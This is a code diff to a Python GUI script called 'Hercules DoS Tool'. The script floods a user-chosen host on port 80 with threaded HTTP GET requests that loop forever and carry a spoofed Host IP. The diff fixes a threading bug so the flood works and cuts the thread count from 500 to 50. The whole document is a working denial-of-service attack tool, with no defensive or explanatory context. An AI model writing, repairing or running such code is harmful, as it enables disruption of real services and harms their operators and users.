@@ -12,28 +12,26 @@ layout = [[sg.Text("Hercules")],
          [sg.Submit(), sg.Cancel()]
          ]
 window = sg.Window(title="Hercules DoS Tool", layout=layout, margins=(100,150))
-url = window.read()[1][0]
+target = window.read()[1][0]
 port = 80
-Trd = 500
+Trd = 50
 fake_ip = '44.197.175.168'
 attack_num = 0
 def attack():
     while True:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect((url, port))
-        s.sendto(("GET /" + url +"HTTP/1.1\r\n").encode('ascii'), (url, port))
-        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (url, port))
+        s.connect((target, port))
+        s.sendto(("GET /" + target +"HTTP/1.1\r\n").encode('ascii'), (target, port))
+        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
 
         global attack_num
         attack_num += 1
 
         s.close()
 for i in range(Trd):
-    thread = threading.Thread(url = attack)
-    thread.start()    
-if __name__ == "__main__":
-    sg.Print("Hercules")
-    print = sg.Print
-    print(attack_num)
-    time.sleep(50)
+    thread = threading.Thread(target = attack)
+    thread.start()
+sg.Print("Hercules")
+sg.Print(attack_num)
+time.sleep(30)
 window.close()
